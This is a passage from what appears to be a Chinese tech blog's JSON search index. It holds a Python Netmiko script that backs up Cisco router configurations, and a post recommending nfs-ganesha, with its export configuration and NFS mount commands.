class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-bgp\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.10\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;secret\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_r1_e1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-r1-e1\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.11\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_r1_e2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-r1-e2\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.12\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_r2_e1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-r2-e1\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.13\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_r2_e2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-r2-e2\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.14\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003edevices\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003etw_bgp\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etw_r1_e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etw_r1_e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etw_r2_e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etw_r2_e2\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003edev\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003edevices\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edev\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003econnection\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eNetmiko\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e**\u003c/span\u003e\u003cspan class=\"n\"\u003edev\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003econnection\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eenable\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eout\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003econnection\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esend_command\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;show running-config\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ecalender\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estrftime\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;%Y%m\u003c/span\u003e\u003cspan class=\"si\"\u003e%d\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003efile_name\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"si\"\u003e{}\u003c/span\u003e\u003cspan class=\"s1\"\u003e-\u003c/span\u003e\u003cspan class=\"si\"\u003e{}\u003c/span\u003e\u003cspan class=\"s1\"\u003e.txt\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eformat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edev\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\u003cspan class=\"n\"\u003ecalender\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003efile\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efile_name\u003c/span\u003e \u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;w\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003efile\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eout\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003efile\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003econnection\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edisconnect\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;BACKUP for \u003c/span\u003e\u003cspan class=\"si\"\u003e%s\u003c/span\u003e\u003cspan class=\"s2\"\u003e done\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e\u003cspan class=\"n\"\u003edev\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Cisco设备自动执行和备份的脚本"},{"content":"NFS Server 很常用，但是坑也是巨大的。之前在京东运维 Hadoop 集群的时候碰到过脑裂，原因就是 NFS 引起的。\n关键 NFS 是内核态的，一旦崩溃，那么客户端的所有命令，ls、df、du等等，统统无反应，结果是很悲剧的。\n下面要推荐一下 nfs-ganesha ，它是用户态的nfs-server，支持v3和v4，而nfs缺省是内核态的v3。\n强烈推荐大家用这个，而不是用内核态的，并且 nfs-ganesha 还是支持 glusterFS 的。\nyum install -y centos-release-nfs-ganesha30.noarch vi /etc/ganesha/ganesha.conf %include /etc/ganesha/exports/gv0.conf vi /etc/ganesha/exports/gv0.conf EXPORT{ Export_Id = 1 ; # Export ID unique to each export Path = \u0026#34;/mnt/upload\u0026#34;; Pseudo = /upload; FSAL { name = VFS; } Access_type = RW; # Access permissions Squash = No_root_squash; # To enable/disable root squashing Disable_ACL = TRUE; # To enable/disable ACL Protocols = \u0026#34;4\u0026#34; ; # NFS protocols supported Transports = \u0026#34;UDP\u0026#34;,\u0026#34;TCP\u0026#34; ; # Transport protocols supported SecType = \u0026#34;sys\u0026#34;; # Security flavors supported } #启动 systemctl restart nfs-ganesha #手动mount的方法 mount -t nfs -o soft,intr,rsize=8192,wsize=8192,timeo=900,proto=tcp,vers=4 192.168.31.2:/upload /mnt/nfs-upload #自动mount的方法 cat /etc/fstab 192.168.31.2:/upload /mnt/nfs-upload nfs rw,vers=4,addr=192.168.31.2,clientaddr=192.168.31.8 0 0 注意id对齐问题可能要用到rpcidmapd\n","permalink":"https://rendoumi.com/posts/20220706-nfs_usermode/","summary":"\u003cp\u003eNFS Server 很常用，但是坑也是巨大的。之前在京东运维 Hadoop 集群的时候碰到过脑裂，原因就是 NFS 引起的。\u003c/p\u003e\n\u003cp\u003e关键 NFS 是内核态的，一旦崩溃，那么客户端的所有命令，ls、df、du等等，统统无反应，结果是很悲剧的。\u003c/p\u003e\n\u003cp\u003e下面要推荐一下 nfs-ganesha ，它是用户态的nfs-server，支持v3和v4，而nfs缺省是内核态的v3。\u003c/p\u003e\n\u003cp\u003e强烈推荐大家用这个，而不是用内核态的，并且 nfs-ganesha 还是支持 glusterFS 的。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y centos-release-nfs-ganesha30.noarch\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/ganesha/ganesha.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e%include /etc/ganesha/exports/gv0.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/ganesha/exports/gv0.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEXPORT\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eExport_Id\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e;\u003c/span\u003e   \u003cspan class=\"c1\"\u003e# Export ID unique to each export\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003ePath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/mnt/upload\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003ePseudo\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e /upload\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    FSAL \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e VFS\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eAccess_type\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e RW\u003cspan class=\"p\"\u003e;\u003c/span\u003e    \u003cspan class=\"c1\"\u003e# Access permissions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eSquash\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e No_root_squash\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# To enable/disable root squashing\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eDisable_ACL\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e TRUE\u003cspan class=\"p\"\u003e;\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# To enable/disable ACL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eProtocols\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;4\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e;\u003c/span\u003e    \u003cspan class=\"c1\"\u003e# NFS protocols supported\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eTransports\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;UDP\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;TCP\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# Transport protocols supported\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eSecType\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;sys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e     \u003cspan class=\"c1\"\u003e# Security flavors supported\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 